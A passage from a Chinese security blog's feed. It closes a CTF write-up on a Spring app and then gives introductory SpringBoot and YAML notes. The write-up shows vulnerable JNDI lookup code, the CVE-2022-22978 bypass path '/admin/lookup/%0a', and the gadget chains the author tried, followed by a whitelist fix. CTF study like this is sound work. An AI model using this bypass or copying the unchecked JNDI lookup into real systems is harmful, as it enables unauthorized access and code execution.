punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>SecurityConfig.class</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>ezspring</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Bean</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Configuration</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>security<span class="token punctuation">.</span>config<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>web<span class="token punctuation">.</span>builders<span class="token punctuation">.</span></span><span class="token class-name">HttpSecurity</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>security<span class="token punctuation">.</span>config<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>web<span class="token punctuation">.</span>configuration<span class="token punctuation">.</span></span><span class="token class-name">EnableWebSecurity</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>security<span class="token punctuation">.</span>config<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>web<span class="token punctuation">.</span>configurers<span class="token punctuation">.</span></span><span class="token class-name">ExpressionUrlAuthorizationConfigurer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>security<span class="token punctuation">.</span>web<span class="token punctuation">.</span></span><span class="token class-name">SecurityFilterChain</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Configuration</span><span class="token annotation punctuation">@EnableWebSecurity</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SecurityConfig</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">SecurityConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> <span class="token class-name">SecurityFilterChain</span> <span class="token function">securityFilterChain</span><span class="token punctuation">(</span><span class="token class-name">HttpSecurity</span> http<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        http<span class="token punctuation">.</span><span class="token function">authorizeRequests</span><span class="token punctuation">(</span><span class="token punctuation">(</span>authorize<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>            <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">ExpressionUrlAuthorizationConfigurer<span class="token punctuation">.</span>AuthorizedUrl</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">ExpressionUrlAuthorizationConfigurer<span class="token punctuation">.</span>AuthorizedUrl</span><span class="token punctuation">)</span>authorize<span class="token punctuation">.</span><span class="token function">regexMatchers</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"/admin/.*"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">authenticated</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">anyRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">permitAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">csrf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">disable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">SecurityFilterChain</span><span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很明显，第一步首先要绕过spring security的限制访问admin路由</p><p>看一下spring-security包的版本，5.6.2</p><p>直接用<a href="https://xz.aliyun.com/t/13235">CVE-2022-22978</a>绕过，访问<code>/admin/lookup/%0a</code>即可进入到lookup</p><p>然后看lookup的操作：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Context</span> ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Object</span> result <span class="token operator">=</span> ctx<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token string">"Lookup successful: "</span> <span class="token operator">+</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一眼jndi，然后我不会打</p><blockquote><p>反序列化就jackson，FactoryObject就BeanFactory<br>jackson1234都没打通，BeanFactory-EL也打不通。最后BeanFactory-yaml打成功了才明白是JDK17，修复了很多JNDI绕过的办法</p></blockquote><h3 id="FIX-1"><a href="#FIX-1" class="headerlink" title="FIX"></a>FIX</h3><p>直接让GPT-4o代工，然后自己打包</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>ezspring<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">Context</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">InitialContext</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestParam</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ResponseBody</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>regex<span class="token punctuation">.</span></span><span class="token class-name">Pattern</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Set</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashSet</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Controller</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/admin"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AdminController</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Pattern</span> <span class="token constant">SAFE_URL_PATTERN</span> <span class="token operator">=</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token function">compile</span><span class="token punctuation">(</span><span class="token string">"^[a-zA-Z0-9:/._-]+$"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> <span class="token constant">ALLOWED_URLS</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Populate the whitelist with allowed JNDI URLs</span>        <span class="token constant">ALLOWED_URLS</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"java:comp/env/jdbc/myDataSource"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// Add other allowed URLs here</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">AdminController</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/*"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"admin"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/lookup/*"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">lookup</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"url"</span><span class="token punctuation">,</span> required <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token class-name">String</span> url<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>url <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string">"missing url parameter"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// Validate the URL input against the pattern</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token constant">SAFE_URL_PATTERN</span><span class="token punctuation">.</span><span class="token function">matcher</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">matches</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string">"Invalid URL format"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// Check if the URL is in the whitelist</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token constant">ALLOWED_URLS</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string">"URL not allowed"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Context</span> ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Object</span> result <span class="token operator">=</span> ctx<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token string">"Lookup successful: "</span> <span class="token operator">+</span> result<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NamingException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            ex<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token string">"Lookup failed"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="mycms（Unsolved）"><a href="#mycms（Unsolved）" class="headerlink" title="mycms（Unsolved）"></a>mycms（Unsolved）</h2>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;个人名称：雲流&lt;/p&gt;
&lt;p&gt;个人排名：68&lt;/p&gt;
&lt;p&gt;签到题都做不来有点难绷&lt;/p&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;第一名的wp：&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=MzUzNDMyNjI3Mg==&amp;mid=2247486883&amp;idx=1&amp;sn=4a99836ee029141df32979be33b0a663&quot;&gt;https://mp.weixin.qq.com/s?__biz=MzUzNDMyNjI3Mg==&amp;amp;mid=2247486883&amp;amp;idx=1&amp;amp;sn=4a99836ee029141df32979be33b0a663&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTF线上赛" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
    <category term="CVE" scheme="http://c1oudfl0w0.github.io/blog/tags/CVE/"/>
    
    <category term="提权" scheme="http://c1oudfl0w0.github.io/blog/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="SSTI" scheme="http://c1oudfl0w0.github.io/blog/tags/SSTI/"/>
    
    <category term="Spring" scheme="http://c1oudfl0w0.github.io/blog/tags/Spring/"/>
    
    <category term="JNDI" scheme="http://c1oudfl0w0.github.io/blog/tags/JNDI/"/>
    
  </entry>
  
  <entry>
    <title>SpringBoot</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/06/28/SpringBoot/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/06/28/SpringBoot/</id>
    <published>2024-06-28T04:17:55.000Z</published>
    <updated>2024-07-15T14:00:33.784Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>开发与安全缺一不可，虽然不知道自己到底少学了多少基础，但是现在就先跟着<a href="https://github.com/Drun1baby/JavaSecurityLearning?tab=readme-ov-file">Drun1baby的学习路线</a>吧</p><p>java第一步，先学SpringBoot，同时我这里也会稍微学一下Spring和SpringMVC</p><p>参考：</p><p><a href="https://www.bilibili.com/video/BV1PE411i7CV">https://www.bilibili.com/video/BV1PE411i7CV</a></p><p><a href="https://www.yuque.com/boogipop/ot88z5/bho0otrcaa8kl1xf">https://www.yuque.com/boogipop/ot88z5/bho0otrcaa8kl1xf</a></p><p><img src="/blog/2024/06/28/SpringBoot/image-20240628122350310.png" alt="image-20240628122350310"></p><span id="more"></span><hr><h1 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h1><p>Spring是一个分层的 JavaSE&#x2F;EE full-stack(一站式) 轻量级开源框架，可以说是给Java程序员带来了春天，因为它的优点是极大地简化了开发</p><p>Spring的理念：不去重新发明轮子。其核心是<strong>控制反转（IOC）和面向切面（AOP）。</strong></p><h2 id="IOC"><a href="#IOC" class="headerlink" title="IOC"></a>IOC</h2><hr><h1 id="SpringMVC"><a href="#SpringMVC" class="headerlink" title="SpringMVC"></a>SpringMVC</h1><h2 id="MVC架构"><a href="#MVC架构" class="headerlink" title="MVC架构"></a>MVC架构</h2><p>之前学习ThinkPHP的时候我们就接触到MVC架构了</p><p>MVC是<strong>Model、View、Controller</strong>的缩写，他们三者的意思分别为：</p><ul><li>Model（模型）：程序员需要操纵的数据以及信息，也就是数据库</li><li>View（视图）：提供用户前端展示界面，是程序的外壳</li><li>Controller（控制器）：他负责根据用户从视图层输入的指令，选取数据层中的数据，然后进行对应的操作，最终产生结果</li></ul><p>所以顺序分别是<code>View-&gt;Controller-&gt;Model</code>，由外到里</p><p>在SpringMVC中这三者分别就对应<code>Servlet</code>，<code>JSP</code>，<code>JavaBean</code></p><hr><h2 id="Controller配置"><a href="#Controller配置" class="headerlink" title="Controller配置"></a>Controller配置</h2><p><code>@RestController</code>注解：放在类上就相当于给每个方法都加了<code>Responsebody</code>注解，加上了<code>Responsebody</code>注解后就是单纯返回一个字符串</p><p><code>@RequestMapping</code>注解：可以用来设置路由，这个注解是放在方法上面的，但同时也可以放在一个类上，<code>GetMapping</code>即以get方式访问，<code>PostMapping</code>即以post方式访问</p><hr><h1 id="SpringBoot"><a href="#SpringBoot" class="headerlink" title="SpringBoot"></a>SpringBoot</h1><p>核心思想：<strong>约定大于配置</strong></p><p>默认帮我们进行了很多设置，多数 Spring Boot 应用只需要很少的 Spring 配置，同时继承了大量常用的第三方库配置（如 Redis），这些第三方库几乎可以零配置开箱即用</p><h2 id="微服务架构"><a href="#微服务架构" class="headerlink" title="微服务架构"></a>微服务架构</h2><p>微服务是一种架构风格，它要求我们在开发一个应用的时候，这个应用必须构建成一系列小服务的组合，可以用http的方式进行互通</p><blockquote><p>单体应用架构（all in one）：一个应用中的所有应用服务都封装在一个应用中，无论是ERP、CRM等系统，都把数据库访问、web访问等功能都放到一个war包内</p></blockquote><p>而微服务架构打破了 all in one 的架构方式，把每个功能元素独立出来，把独立出来的功能元素进行动态组合</p><p>最初的架构图：</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240628131837088.png" alt="image-20240628131837088"></p><p>随着需求变多，用户量变大，数据库公用可能出现冲突矛盾，因此微服务架构诞生，其架构图：</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240628131932293.png" alt="image-20240628131932293"></p><p>如果需要修改其中的一个功能，只需要更新升级其中一个功能服务单元即可</p><hr><h2 id="第一个SpringBoot程序"><a href="#第一个SpringBoot程序" class="headerlink" title="第一个SpringBoot程序"></a>第一个SpringBoot程序</h2><p>喜报：官方已经提供了一个快速生成SpringBoot的网站：<a href="https://start.spring.io/">https://start.spring.io/</a></p><p><img src="/blog/2024/06/28/SpringBoot/image-20240628135947174.png" alt="image-20240628135947174"></p><p>SNAPSHOT是快照版本，右上角可以添加依赖，这里是添加了个web依赖（包括web.xml，tomcat等），generate后会下载一个zip文件，然后导入到IDE即可</p><p>当然IDEA也集成了这个网站</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240628135431282.png" alt="image-20240628135431282"></p><p>注意：Spring Boot 3.0.0后只使用Java 17以上的版本，而官方源不再支持3.0以下的版本，如果我们要使用jdk1.8来创建则需要换源为阿里云：<a href="https://start.aliyun.com/">https://start.aliyun.com/</a></p><p><img src="/blog/2024/06/28/SpringBoot/image-20240628140506089.png" alt="image-20240628140506089"></p><p>设置spring boot版本和依赖</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240629203344403.png" alt="image-20240629203344403"></p><p>于是就直接创建了，然后依赖的jar包会自动进行下载</p><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><p><img src="/blog/2024/06/28/SpringBoot/image-20240708174238564.png" alt="image-20240708174238564"></p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">├─.idea│  └─libraries├─.mvn│  └─wrapper├─src│  ├─main│  │  ├─java│  │  │  └─com│  │  │      └─example│  │  │          └─demo│  │  └─resources│  │      ├─static│  │      └─templates│  └─test│      └─java│          └─com│              └─example│                  └─demo└─target    ├─classes    │  └─com    │      └─example    │          └─demo    └─generated-sources        └─annotations<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的Application.java文件就是我们SpringBoot的主程序，即程序的主入口，之后启动web服务器就是运行这个文件</p><p>SpringBoot本质上还是一个Tomcat程序，它内置了tomcat服务器，并且经过了改动，因此启动比Tomcat迅速许多</p><p>pom.xml的依赖中，<code>org.springframework.boot</code>包括了tomcat，dispatcherServlet，xml</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-boot-starter-web<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>接下来尝试运行，访问本地的8080端口</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240708174526239.png" alt="image-20240708174526239"></p><p>此时我们还没添加任何的静态资源和controller，所以返回404</p><hr><h3 id="创建一个简单的controller"><a href="#创建一个简单的controller" class="headerlink" title="创建一个简单的controller"></a>创建一个简单的controller</h3><p>在 Application.java 的同级目录下创建一个controller package，然后在里面写一个HelloController.java</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RestController</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@RestController</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloController</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/hello"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">// 调用业务，接收前端参数</span>        <span class="token keyword">return</span> <span class="token string">"hello,world"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样就创建了一个接口：<a href="http://localhost:8080/hello">http://localhost:8080/hello</a></p><p><img src="/blog/2024/06/28/SpringBoot/image-20240708181144025.png" alt="image-20240708181144025"></p><p>成功访问</p><hr><h3 id="配置端口"><a href="#配置端口" class="headerlink" title="配置端口"></a>配置端口</h3><p>在application.properties里添加<code>server.port</code>即可指定端口</p><hr><h3 id="SpringBoot自动装配原理"><a href="#SpringBoot自动装配原理" class="headerlink" title="SpringBoot自动装配原理"></a>SpringBoot自动装配原理</h3><p>没怎么学Spring，一时半会还感受不到SpringBoot的核心魅力</p><p>先放个参考文章在这：<a href="https://www.cnblogs.com/javaguide/p/springboot-auto-config.html">https://www.cnblogs.com/javaguide/p/springboot-auto-config.html</a></p><hr><h2 id="Yaml语法"><a href="#Yaml语法" class="headerlink" title="Yaml语法"></a>Yaml语法</h2><p>编Docker-compose，配置hexo博客时已经非常熟悉了，这边粗略写点基本的语法</p><h3 id="语法特点"><a href="#语法特点" class="headerlink" title="语法特点"></a>语法特点</h3><ul><li>大小写敏感</li><li>和python类似，使用缩进表示层级关系</li><li>缩进不允许使用tab，只允许空格</li><li>缩进的空格数不重要，只要同级元素左对齐即可</li><li><code>#</code>表示注释</li></ul><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><ul><li>对象：键值对的集合，又称为映射，哈希，字典</li><li>数组：一组按次序排列的元素</li><li>纯量：实际上就是普通的单一变量</li></ul><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token comment">#对象的用法</span><span class="token key atrule">Person</span><span class="token punctuation">:</span>  <span class="token key atrule">name</span><span class="token punctuation">:</span> Azusa  <span class="token key atrule">age</span><span class="token punctuation">:</span> <span class="token number">16</span>  <span class="token comment">#子对象</span>  <span class="token key atrule">Dog</span><span class="token punctuation">:</span>      <span class="token key atrule">name</span><span class="token punctuation">:</span> Gino      <span class="token key atrule">age</span><span class="token punctuation">:</span> <span class="token number">7</span><span class="token comment">#数组用法,下面例子表示Human:["YourName","YourAge","Nothing"]</span><span class="token key atrule">Human</span><span class="token punctuation">:</span>    <span class="token punctuation">-</span> YourName    <span class="token punctuation">-</span> YourAge    <span class="token punctuation">-</span> Nothing<span class="token comment">#或者</span><span class="token key atrule">Human2</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">]</span><span class="token comment">#字成员用法 A:[1,2,[1,2,3]]</span><span class="token key atrule">A</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> <span class="token number">1</span>  <span class="token punctuation">-</span> <span class="token number">2</span>  <span class="token punctuation">-</span>    <span class="token punctuation">-</span> <span class="token number">1</span>    <span class="token punctuation">-</span> <span class="token number">2</span>    <span class="token punctuation">-</span> <span class="token number">3</span><span class="token comment">#还有复杂一点的用法，companies: [&#123;id: 1,name: company1,price: 200W&#125;,&#123;id: 2,name: company2,price: 500W&#125;]</span><span class="token key atrule">companies</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span>    <span class="token key atrule">id</span><span class="token punctuation">:</span> <span class="token number">1</span>    <span class="token key atrule">name</span><span class="token punctuation">:</span> company1    <span class="token key atrule">price</span><span class="token punctuation">:</span> 200w  <span class="token punctuation">-</span>    <span class="token key atrule">id</span><span class="token punctuation">:</span> <span class="token number">2</span>    <span class="token key atrule">name</span><span class="token punctuation">:</span> company2    <span class="token key atrule">price</span><span class="token punctuation">:</span> 300w<span class="token comment">#复合结构</span><span class="token key atrule">languages</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> ruby  <span class="token punctuation">-</span> perl  <span class="token punctuation">-</span> python<span class="token key atrule">websites</span><span class="token punctuation">:</span>  <span class="token key atrule">Yaml</span><span class="token punctuation">:</span> yaml.org  <span class="token key atrule">ruby</span><span class="token punctuation">:</span> ruby.org  <span class="token key atrule">python</span><span class="token punctuation">:</span> python.org<span class="token 